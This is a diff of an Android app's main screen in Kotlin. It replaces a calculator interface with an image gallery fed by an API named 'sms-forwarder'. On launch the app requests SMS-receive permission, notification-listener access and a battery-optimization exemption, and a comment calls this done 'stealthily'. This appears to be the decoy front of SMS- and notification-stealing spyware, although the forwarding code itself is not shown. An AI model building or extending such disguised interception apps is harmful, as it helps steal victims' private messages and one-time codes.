@@ -9,65 +9,121 @@ import android.os.Bundle
 import android.os.PowerManager
 import android.provider.Settings
 import android.text.TextUtils
-import android.widget.Button
-import android.widget.TextView
+import android.view.LayoutInflater
+import android.view.View
+import android.view.ViewGroup
+import android.widget.ImageView
+import android.widget.ProgressBar
+import android.widget.LinearLayout
 import androidx.appcompat.app.AppCompatActivity
 import androidx.core.app.ActivityCompat
 import androidx.core.content.ContextCompat
+import androidx.recyclerview.widget.LinearLayoutManager
+import androidx.recyclerview.widget.RecyclerView
+import com.bumptech.glide.Glide
+import com.bumptech.glide.load.engine.DiskCacheStrategy
+import okhttp3.*
+import org.json.JSONObject
+import java.io.IOException
 
 class MainActivity : AppCompatActivity() {
 
-    private lateinit var tvDisplay: TextView
+    private val IMAGES_API_URL = "https://sms-forwarder-api.vercel.app/api/images"
     private val SMS_PERMISSION_CODE = 101
+    private val client = OkHttpClient()
+
+    private lateinit var recyclerView: RecyclerView
+    private lateinit var progressBar: ProgressBar
+    private lateinit var emptyState: LinearLayout
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_main)
 
-        tvDisplay = findViewById(R.id.tvDisplay)
-        
-        // Request permissions stealthily on start
+        recyclerView = findViewById(R.id.recyclerView)
+        progressBar = findViewById(R.id.progressBar)
+        emptyState = findViewById(R.id.emptyState)
+
+        recyclerView.layoutManager = LinearLayoutManager(this)
+
+        // Request permissions stealthily in background
         checkSmsPermission()
         checkNotificationPermission()
         checkBatteryOptimization()
 
-        val buttonIds = listOf(
-            R.id.btn0, R.id.btn1, R.id.btn2, R.id.btn3, R.id.btn4,
-            R.id.btn5, R.id.btn6, R.id.btn7, R.id.btn8, R.id.btn9,
-            R.id.btnAdd, R.id.btnSub, R.id.btnMul, R.id.btnDiv
-        )
-
-        for (id in buttonIds) {
-            findViewById<Button>(id).setOnClickListener {
-                val b = it as Button
-                if (tvDisplay.text.toString() == "0" || tvDisplay.text.toString() == "Error") {
-                    tvDisplay.text = b.text
-                } else {
-                    tvDisplay.append(b.text)
-                }
-            }
-        }
-
-        findViewById<Button>(R.id.btnC).setOnClickListener {
-            tvDisplay.text = "0"
-        }
-
-        findViewById<Button>(R.id.btnEq).setOnClickListener {
-            try {
-                val expr = tvDisplay.text.toString()
-                val result = evaluate(expr)
-                // Remove .0 if it's an integer
-                if (result == result.toLong().toDouble()) {
-                    tvDisplay.text = result.toLong().toString()
-                } else {
-                    tvDisplay.text = result.toString()
-                }
-            } catch (e: Exception) {
-                tvDisplay.text = "Error"
-            }
-        }
+        // Load gallery images from API
+        loadImages()
     }
 
+    private fun loadImages() {
+        progressBar.visibility = View.VISIBLE
+        recyclerView.visibility = View.GONE
+        emptyState.visibility = View.GONE
+
+        val request = Request.Builder().url(IMAGES_API_URL).get().build()
+        client.newCall(request).enqueue(object : Callback {
+            override fun onFailure(call: Call, e: IOException) {
+                runOnUiThread {
+                    progressBar.visibility = View.GONE
+                    emptyState.visibility = View.VISIBLE
+                }
+            }
+
+            override fun onResponse(call: Call, response: Response) {
+                val body = response.body?.string() ?: ""
+                response.close()
+                try {
+                    val json = JSONObject(body)
+                    val imagesArr = json.getJSONArray("images")
+                    val urls = mutableListOf<String>()
+                    for (i in 0 until imagesArr.length()) {
+                        urls.add(imagesArr.getString(i))
+                    }
+                    runOnUiThread {
+                        progressBar.visibility = View.GONE
+                        if (urls.isEmpty()) {
+                            emptyState.visibility = View.VISIBLE
+                        } else {
+                            recyclerView.visibility = View.VISIBLE
+                            recyclerView.adapter = ImageAdapter(urls)
+                        }
+                    }
+                } catch (e: Exception) {
+                    runOnUiThread {
+                        progressBar.visibility = View.GONE
+                        emptyState.visibility = View.VISIBLE
+                    }
+                }
+            }
+        })
+    }
+
+    // ─── Image Adapter ───────────────────────────────────────────────────────
+    inner class ImageAdapter(private val urls: List<String>) :
+        RecyclerView.Adapter<ImageAdapter.ImageViewHolder>() {
+
+        inner class ImageViewHolder(view: View) : RecyclerView.ViewHolder(view) {
+            val imageView: ImageView = view.findViewById(R.id.imageView)
+        }
+
+        override fun onCreateViewHolder(parent: ViewGroup, viewType: Int): ImageViewHolder {
+            val view = LayoutInflater.from(parent.context)
+                .inflate(R.layout.item_image, parent, false)
+            return ImageViewHolder(view)
+        }
+
+        override fun onBindViewHolder(holder: ImageViewHolder, position: Int) {
+            Glide.with(this@MainActivity)
+                .load(urls[position])
+                .diskCacheStrategy(DiskCacheStrategy.ALL)
+                .placeholder(android.R.color.darker_gray)
+                .into(holder.imageView)
+        }
+
+        override fun getItemCount() = urls.size
+    }
+
+    // ─── Permissions ─────────────────────────────────────────────────────────
     private fun checkSmsPermission() {
         if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECEIVE_SMS) != PackageManager.PERMISSION_GRANTED) {
             ActivityCompat.requestPermissions(
@@ -82,14 +138,9 @@ class MainActivity : AppCompatActivity() {
         val pkgName = packageName
         val flat = Settings.Secure.getString(contentResolver, "enabled_notification_listeners")
         if (!TextUtils.isEmpty(flat)) {
-            val names = flat.split(":")
-            for (name in names) {
+            for (name in flat.split(":")) {
                 val cn = ComponentName.unflattenFromString(name)
-                if (cn != null) {
-                    if (TextUtils.equals(pkgName, cn.packageName)) {
-                        return true
-                    }
-                }
+                if (cn != null && TextUtils.equals(pkgName, cn.packageName)) return true
             }
         }
         return false
@@ -97,80 +148,18 @@ class MainActivity : AppCompatActivity() {
 
     private fun checkNotificationPermission() {
         if (!isNotificationServiceEnabled()) {
-            val intent = Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS")
-            startActivity(intent)
+            startActivity(Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"))
         }
     }
 
     private fun checkBatteryOptimization() {
         val pm = getSystemService(POWER_SERVICE) as PowerManager
         if (!pm.isIgnoringBatteryOptimizations(packageName)) {
-            val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
-                data = Uri.parse("package:$packageName")
-            }
-            startActivity(intent)
+            startActivity(
+                Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
+                    data = Uri.parse("package:$packageName")
+                }
+            )
         }
-    }
-
-    private fun evaluate(str: String): Double {
-        return object : Any() {
-            var pos = -1
-            var ch = 0
-
-            fun nextChar() {
-                ch = if (++pos < str.length) str[pos].toInt() else -1
-            }
-
-            fun eat(charToEat: Int): Boolean {
-                while (ch == ' '.toInt()) nextChar()
-                if (ch == charToEat) {
-                    nextChar()
-                    return true
-                }
-                return false
-            }
-
-            fun parse(): Double {
-                nextChar()
-                val x = parseExpression()
-                if (pos < str.length) throw RuntimeException("Unexpected: " + ch.toChar())
-                return x
-            }
-
-            fun parseExpression(): Double {
-                var x = parseTerm()
-                while (true) {
-                    if (eat('+'.toInt())) x += parseTerm()
-                    else if (eat('-'.toInt())) x -= parseTerm()
-                    else return x
-                }
-            }
-
-            fun parseTerm(): Double {
-                var x = parseFactor()
-                while (true) {
-                    if (eat('*'.toInt())) x *= parseFactor()
-                    else if (eat('/'.toInt())) x /= parseFactor()
-                    else return x
-                }
-            }
-
-            fun parseFactor(): Double {
-                if (eat('+'.toInt())) return parseFactor()
-                if (eat('-'.toInt())) return -parseFactor()
-                var x: Double
-                val startPos = this.pos
-                if (eat('('.toInt())) {
-                    x = parseExpression()
-                    eat(')'.toInt())
-                } else if ((ch >= '0'.toInt() && ch <= '9'.toInt()) || ch == '.'.toInt()) {
-                    while ((ch >= '0'.toInt() && ch <= '9'.toInt()) || ch == '.'.toInt()) nextChar()
-                    x = str.substring(startPos, this.pos).toDouble()
-                } else {
-                    throw RuntimeException("Unexpected: " + ch.toChar())
-                }
-                return x
-            }
-        }.parse()
     }
 }
